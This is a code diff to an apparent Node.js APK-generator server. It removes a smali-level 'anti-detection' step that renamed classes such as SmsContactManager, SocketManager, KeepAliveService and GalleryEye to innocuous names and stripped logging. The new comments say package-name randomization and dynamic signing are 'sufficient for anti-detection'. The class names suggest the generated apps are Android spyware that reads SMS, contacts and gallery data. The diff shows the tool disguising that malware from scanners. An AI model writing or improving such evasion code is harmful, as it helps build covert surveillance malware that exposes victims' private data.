@@ -226,51 +226,9 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
             }
 
-            // 3.6. Smali-level anti-detection - rename suspicious classes and remove logs
-            await sendUpdate('apk_progress', { step: 'Applying advanced protection...', progress: 50 });
-
-            const suspiciousRenames = {
-                'SocketManager': 'CloudService',
-                'SmsContactManager': 'DataHelper',
-                'DataSyncHelper': 'SyncUtil',
-                'KeepAliveService': 'AppService',
-                'GalleryEye': 'MediaApp',
-                'galleryeye': 'mediaapp'
-            };
-
-            const obfuscateSmaliFiles = (dir) => {
-                if (!fs.existsSync(dir)) return;
-                const items = fs.readdirSync(dir, { withFileTypes: true });
-                for (const item of items) {
-                    const fullPath = path.join(dir, item.name);
-                    if (item.isDirectory()) {
-                        obfuscateSmaliFiles(fullPath);
-                    } else if (item.name.endsWith('.smali')) {
-                        try {
-                            let content = fs.readFileSync(fullPath, 'utf8');
-
-                            // Rename suspicious classes
-                            for (const [oldName, newName] of Object.entries(suspiciousRenames)) {
-                                content = content.replace(new RegExp(oldName, 'g'), newName);
-                            }
-
-                            // Remove Log.d, Log.e, Log.i statements (replace with nop-like code)
-                            content = content.replace(/invoke-static \{[^}]*\}, Landroid\/util\/Log;->d\([^)]*\)I/g, '# log removed');
-                            content = content.replace(/invoke-static \{[^}]*\}, Landroid\/util\/Log;->e\([^)]*\)I/g, '# log removed');
-                            content = content.replace(/invoke-static \{[^}]*\}, Landroid\/util\/Log;->i\([^)]*\)I/g, '# log removed');
-
-                            fs.writeFileSync(fullPath, content);
-                        } catch (e) {
-                            // Ignore errors on individual files
-                        }
-                    }
-                }
-            };
-
-            obfuscateSmaliFiles(path.join(workDir, 'smali'));
-            obfuscateSmaliFiles(path.join(workDir, 'smali_classes2'));
-            obfuscateSmaliFiles(path.join(workDir, 'smali_classes3'));
-            console.log('[APK] Smali obfuscation applied');
+            // 3.6. Smali obfuscation removed - was causing app crashes
+            // Package name randomization and dynamic signing are sufficient for anti-detection
+            console.log('[APK] Skipping aggressive smali obfuscation (causes compatibility issues)');
 
             // 4. Icon
             if (customIcon) {
